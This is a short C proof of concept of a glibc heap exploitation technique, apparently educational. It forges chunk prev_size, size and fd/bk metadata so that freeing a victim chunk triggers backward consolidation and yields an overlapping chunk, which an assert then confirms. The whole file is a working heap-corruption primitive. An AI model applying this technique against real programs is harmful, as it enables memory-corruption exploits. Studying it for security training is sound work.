#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    long *consolidated_chunk, *victim, *guard;

    consolidated_chunk = malloc(0x80);
    victim = malloc(0x410);
    guard = malloc(0x10); // Avoid top-chunk consolidate

    /* Setup victim prev_size & size fields */
    victim[-2] = 0x90;
    victim[-1] = 0x420;

    /* Create a FAKE main_arena */
    consolidated_chunk[8] = (long)&consolidated_chunk[-2];
    consolidated_chunk[9] = (long)&consolidated_chunk[-2];

    /* Create a FAKE fd/bk */
    consolidated_chunk[0] = (long)&consolidated_chunk[6];
    consolidated_chunk[1] = (long)&consolidated_chunk[6];

    free(victim); // Triger backfwd consolidation
    // After this, our victim chunk would be freed, and due to backward consolidation it will be merged with the consolidated_chunk
    // This create an overlapping chunk on a 0x90 (include metadata) chunk
    long *overlaping_chunk = malloc(0x80);
    long *new_chunk = malloc(0x410);

    // Confirm again
    assert(overlaping_chunk == consolidated_chunk);

    return 0;
}
